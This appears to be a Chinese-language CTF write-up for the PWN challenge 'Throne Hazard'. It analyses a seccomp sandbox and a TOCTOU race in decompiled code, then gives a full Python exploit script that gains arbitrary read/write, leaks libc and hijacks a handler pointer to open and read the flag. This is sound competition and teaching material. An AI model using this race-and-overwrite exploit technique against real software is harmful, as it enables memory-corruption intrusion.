---
layout: post
title: "Throne Hazard"
date: 2026-10-07 20:05:00 +0800
tags: ["CTF", "Write-up"]
description: "Notes and solution for Throne Hazard from polar (2026)."
source_folder: "Write-ups/2026/polar/PWN"
lang: zh-CN
---
{% raw %}

## 沙箱

```
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003
 0002: 0x06 0x00 0x00 0x80000000  return KILL_PROCESS
 0003: 0x20 0x00 0x00 0x00000000  A = sys_number
 0004: 0x15 0x0a 0x00 0x0000003b  if (A == execve) goto 0015
 0005: 0x15 0x09 0x00 0x00000142  if (A == execveat) goto 0015
 0006: 0x15 0x08 0x00 0x00000009  if (A == mmap) goto 0015
 0007: 0x15 0x07 0x00 0x0000000a  if (A == mprotect) goto 0015
 0008: 0x15 0x06 0x00 0x00000149  if (A == pkey_mprotect) goto 0015
 0009: 0x15 0x05 0x00 0x00000019  if (A == mremap) goto 0015
 0010: 0x15 0x04 0x00 0x00000038  if (A == clone) goto 0015
 0011: 0x15 0x03 0x00 0x00000039  if (A == fork) goto 0015
 0012: 0x15 0x02 0x00 0x0000003a  if (A == vfork) goto 0015
 0013: 0x15 0x01 0x00 0x000001b3  if (A == 0x1b3) goto 0015
 0014: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0015: 0x06 0x00 0x00 0x00050001  return ERRNO(1)
```
ban了`execve`、`execveat`，不能get shell，甚至ban了`mprotect`，shellcode打orw也不行。

## 思路

程序有一个toctou，开头会调如下函数：
```c
void __fastcall __noreturn start_routine()
{
  int tar; // r12d
  __useconds_t v1; // r14d
  __useconds_t v2; // ebp
  struct timespec v3; // [rsp+0h] [rbp-48h] BYREF
  unsigned __int64 v4; // [rsp+18h] [rbp-30h]

  v4 = __readfsqword(0x28u);
  while ( 1 )
  {
    if ( flag_start == 1 )
    {
      tar = target;
      v1 = 120000;
      if ( !clock_gettime(1, &v3) )
        v1 = (((unsigned int)(LODWORD(v3.tv_nsec) ^ (LODWORD(v3.tv_nsec) >> 7)) >> 17)
            ^ LODWORD(v3.tv_nsec)
            ^ (LODWORD(v3.tv_nsec) >> 7))
           % 0x2BF20
           + 120000;
      v2 = 18000;
      if ( !clock_gettime(1, &v3) )
        v2 = (((unsigned int)(LODWORD(v3.tv_nsec) ^ (LODWORD(v3.tv_nsec) >> 7)) >> 17)
            ^ LODWORD(v3.tv_nsec)
            ^ (LODWORD(v3.tv_nsec) >> 7))
           % 0x4650
           + 18000;
      usleep(v1);
      toctou_len = tar;
      usleep(v2);
      toctou_len = 32;
      flag_start = 0;
    }
    usleep(0x96u);
  }
}
```

注意到会先`sleep(120000~0x2BF20  + 120000)`，这段时间中，`toctou_len`变量的大小会被改成之前可以指定的值，再次`sleep(18000~0x4650+ 18000)`之后，会被重新赋值为`0x20`。

再注意choice2：
```c
 case 2uLL:
        byte = 0;
        if ( (unsigned int)toctou_len > 0x20 )
        {
          puts("the robot already owns the value, wait for the floor cycle");
        }
        else
        {
          if ( !chunk )
          {
            qword_4041F0 = 48;
            chunk_ca = calloc(0x30u, 1u);
            if ( !chunk_ca )
LABEL_37:
              put("allocator offline");
            chunk = (__int64)chunk_ca;
          }
          puts("operator baseline sampled");
          flag_start = 1;                       // 子线程启动
          __printf_chk(1, "forge primer (1 byte)> ");
          read_len((__int64)&byte, 1u);         // 可以在这里写偏移进行越写
          *(_BYTE *)chunk = byte;
          v10 = (unsigned int)toctou_len + 15LL;
          __printf_chk(1, "forge stream (%#zx bytes left)> ", v10);
          read_len(chunk + 1, v10);             // 这里有一个偏移
          flag_start = 0;
          toctou_len = 32;
          puts("\nforge committed");
        }
        break;
```
也就是说，卡好时间就能进行越写。

先正常申请一次 capsule，再申请 actuator。之后利用toutoc越写把 actuator 改成：

- `lane = 1`
- `len = 8`
- `ptr = 0x4041e0`

这样就能把全局 `qword_4041e0` 改到 `broadcast`，后面我们就能一直用 `option 5` 伪造 fake actuator，得到稳定的任意读写。

## 利用

1. 用 lane0 读 `read@got`，算出 libc 基址
2. 把 `hander[2]` 改成 `open`
3. 用actuator 调 `open("/flag", 0)`，返回的 fd 是 `3`
4. 把 `hander[3]` 改成 `read`
5. 循环执行 `read(3, 0x404300, 3)`，用 lane0 读 `0x404300` 就是 flag

## exp
```python
def cmd(choi):
    sla(b"> ", n2ds(choi))


def set_tar(size):
    cmd(1)
    sa(b"appeal target (0x20-0x78)> ", n2ds(size))


def toctou(payload, len):
    cmd(2)
    sleep(0.21)
    sa(b"forge primer (1 byte)> ", payload[:1])
    global data
    data = ru(b"bytes left)> ")
    print(data)
    if b"0x87" in data:
        s(
            (payload[1:]).ljust(len, b"\0"),
        )
        lane_hander()
    else:
        s(b"\0" * 0x2F)


def set_cap(payload, len):
    cmd(2)
    sleep(0.4)
    sa(b"forge primer (1 byte)> ", payload[:1])
    sa(b"forge stream (0x2f bytes left)> ", (payload[1:]).ljust(len, b"\0"))


def create_act():
    cmd(3)


def set_status(con):
    cmd(4)
    sla(b"seed line> ", con)


def broadcast(con):
    cmd(5)
    sla(b"broadcast line> ", con)


def lane_hander():
    cmd(6)


def show():
    cmd(7)


def exit():
    cmd(8)


def pwn():
    set_cap(b"a" * 8, 0x20 + 15)
    create_act()

    def read(addr, len, con):
        toctou(
            b"\0" * 0x30
            + p64(0)
            + p64(0x51)
            + b"a" * 0x10
            + p32(1)
            + p32(1)
            + p64(len)
            + p64(addr),
            0x78 + 15,
        )
        if b"0x87" in data:
            s(con)
            return 1
        return 0

    if read(0x4041E0, 8, p64(0x404160)):
        hand = 0x4040E0

        def hander(lane, r0, r1):
            fake_actu = flat(
                {
                    0x10: p32(lane),
                    0x14: p32(1),
                    0x18: r1,  # len
                    0x20: r0,  # addr
                },
                filler=b"\0",
            )
            broadcast(fake_actu)
            lane_hander()

        hander(0, 0x403F90, 6)
        ru(b"]\n")
        libc.address = uu64(rn(6)) - libc.sym["read"]
        look("libc.address")

        def set_hand(n, addr):
            hander(1, hand + 8 * n, 8)
            s(p64(addr))

        def call(func, r0, r1):
            set_hand(2, libc.sym[func])
            hander(2, r0, r1)

        hander(1, 0x404128, 6)
        sleep(0.1)
        s(b"./flag")
        call("open", 0x404128, 0)
        dbg()
        for _ in range(60):
            call("read", 3, 0x404128 + _ * 2)

        hander(0, 0x404128, 60)
        print(rn(60))

        ia()


file = "/home/qwer/pwn/pwn"
host = "node5.buuoj.cn"
port = 25707
libc_path = "./libc.so.6"


while True:
    io, p, libc = init(file, host, port, libc_path)
    pwn()
```

## tips

前面沙箱ban的很多，所以很难通过io获取执行流，所以想到可以通过劫持actu指针，来控制程序的`hander`函数，控制执行流。
{% endraw %}
